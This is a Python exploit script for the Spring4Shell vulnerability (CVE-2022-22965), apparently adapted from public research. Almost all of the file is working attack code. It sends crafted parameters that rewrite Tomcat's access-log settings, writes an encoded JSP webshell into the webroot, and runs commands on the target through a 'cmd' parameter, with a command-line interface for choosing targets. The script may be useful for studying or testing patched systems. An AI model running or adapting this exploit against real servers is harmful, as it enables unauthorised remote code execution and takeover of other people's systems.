#!/usr/bin/env python3
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Based on public research and exploits for CVE-2022-22965
# Original vulnerability discovered by:
#  Rapid7 and VMware Security Research Team
#
# Exploit adapted for repository by:
#  Hyperion Gray Security Research Team
#

"""
Spring4Shell (CVE-2022-22965) Remote Code Execution Exploit

This exploit targets a critical remote code execution vulnerability in the Spring
Framework. The vulnerability allows attackers to modify Tomcat logging configuration
through data binding, which can be leveraged to write arbitrary JSP files to the
webroot, achieving remote code execution.

Affected versions:
- Spring Framework 5.3.0 through 5.3.17
- Spring Framework 5.2.0 through 5.2.19
- Older unsupported versions

Requirements:
- Target must be running Spring Framework (spring-webmvc or spring-webflux)
- Target must be deployed as WAR on Apache Tomcat
- Target must be running on Java 9 or higher

The exploit works by abusing Spring's data binding to modify Tomcat's AccessLogValve
configuration, setting custom log patterns, filenames, and directories to create a
JSP webshell in the application's webroot.
"""

import argparse
import requests
import sys
import time
import secrets
import warnings

# Suppress SSL warnings
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()


def generate_webshell_payload():
    """
    Generate a simple JSP webshell payload that executes commands.
    
    Returns:
        URL-encoded JSP webshell code
    """
    # Simple JSP webshell that executes commands passed via 'cmd' parameter
    jsp_shell = """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
    }
%>"""
    
    # URL encode the payload for use in log pattern
    # The payload will be written to a log file which becomes executable JSP
    encoded_payload = (
        "%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20"
        "%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22))."
        "getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20"
        "b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)"
        "%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
    )
    
    return encoded_payload


def exploit_spring4shell(target_url, shell_name=None, directory="webapps/ROOT"):
    """
    Exploit CVE-2022-22965 to upload a webshell.
    
    Args:
        target_url: The target Spring application URL
        shell_name: Custom webshell filename (default: random)
        directory: Target directory for webshell (default: webapps/ROOT)
        
    Returns:
        URL of uploaded webshell if successful, None otherwise
    """
    # Generate random shell name if not provided
    if not shell_name:
        shell_name = f"shell_{secrets.token_hex(4)}"
    
    print(f"[*] Targeting: {target_url}")
    print(f"[*] Shell name: {shell_name}.jsp")
    print(f"[*] Target directory: {directory}")
    
    # Prepare the exploit payloads
    # These parameters abuse Spring's data binding to modify Tomcat AccessLogValve
    
    # Step 1: Set the log pattern to our webshell code
    log_pattern = (
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
        + generate_webshell_payload()
    )
    
    # Step 2: Set the log file suffix to .jsp
    log_suffix = (
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    )
    
    # Step 3: Set the directory where log files (our shell) will be written
    log_directory = (
        f"class.module.classLoader.resources.context.parent.pipeline.first.directory="
        f"{directory}"
    )
    
    # Step 4: Set the log file prefix (our shell name)
    log_prefix = (
        f"class.module.classLoader.resources.context.parent.pipeline.first.prefix="
        f"{shell_name}"
    )
    
    # Step 5: Clear the file date format to make the filename predictable
    log_date_format = (
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    )
    
    # Combine all parameters
    exploit_data = "&".join([
        log_pattern,
        log_suffix,
        log_directory,
        log_prefix,
        log_date_format
    ])
    
    # Additional headers for the webshell injection
    exploit_headers = {
        "prefix": "<%",
        "suffix": "%>//",
        "c": "Runtime"
    }
    
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    try:
        session = requests.Session()
        session.verify = False
        
        # Send the exploit - modify Tomcat logging configuration
        print("[*] Sending exploit payload to modify Tomcat logging configuration...")
        response = session.post(
            target_url,
            headers=headers,
            data=exploit_data,
            timeout=15
        )
        
        if response.status_code != 200:
            print(f"[-] Exploit may have failed - HTTP {response.status_code}")
            return None
        
        print("[+] Configuration modified successfully")
        
        # Wait for Tomcat to process the configuration change
        print("[*] Waiting for Tomcat to apply changes...")
        time.sleep(3)
        
        # Trigger the webshell creation by sending a request with our headers
        print("[*] Triggering webshell creation...")
        session.get(
            target_url,
            headers=exploit_headers,
            timeout=15
        )
        
        # Wait for the file to be written
        time.sleep(2)
        
        # Construct the webshell URL
        shell_url = f"{target_url.rstrip('/')}/{shell_name}.jsp"
        
        # Test if the shell is accessible
        print(f"[*] Testing webshell at: {shell_url}")
        test_response = session.get(f"{shell_url}?cmd=whoami", timeout=10)
        
        if test_response.status_code == 200:
            print("[+] Webshell uploaded successfully!")
            print(f"[+] Shell URL: {shell_url}?cmd=YOUR_COMMAND")
            print(f"\n[*] Example: {shell_url}?cmd=whoami")
            return shell_url
        else:
            print(f"[-] Webshell may not be accessible - HTTP {test_response.status_code}")
            print(f"[-] Try manually accessing: {shell_url}?cmd=whoami")
            return shell_url
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during exploitation: {e}")
        return None


def test_webshell(shell_url, command):
    """
    Test an uploaded webshell by executing a command.
    
    Args:
        shell_url: URL of the webshell
        command: Command to execute
    """
    try:
        response = requests.get(
            f"{shell_url}?cmd={command}",
            verify=False,
            timeout=10
        )
        
        if response.status_code == 200:
            print(f"\n[*] Command output:")
            print(response.text)
        else:
            print(f"[-] Command execution failed - HTTP {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error executing command: {e}")


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2022-22965 (Spring4Shell) Remote Code Execution Exploit',
        epilog='Example: python exploit.py -t http://target.com:8080/app/'
    )
    
    parser.add_argument(
        '-t', '--target',
        required=True,
        help='Target Spring application URL (e.g., http://192.168.1.1:8080/)'
    )
    
    parser.add_argument(
        '-n', '--name',
        help='Custom webshell filename (default: random)'
    )
    
    parser.add_argument(
        '-d', '--directory',
        default='webapps/ROOT',
        help='Target directory for webshell (default: webapps/ROOT)'
    )
    
    parser.add_argument(
        '-c', '--command',
        help='Command to execute after exploitation (for testing)'
    )
    
    args = parser.parse_args()
    
    print("\n" + "="*70)
    print("  CVE-2022-22965 (Spring4Shell) RCE Exploit")
    print("  Spring Framework Remote Code Execution")
    print("="*70 + "\n")
    
    # Execute the exploit
    shell_url = exploit_spring4shell(args.target, args.name, args.directory)
    
    if shell_url and args.command:
        print(f"\n[*] Executing test command: {args.command}")
        test_webshell(shell_url, args.command)
    
    # Exit with appropriate status code
    sys.exit(0 if shell_url else 1)


if __name__ == '__main__':
    main()
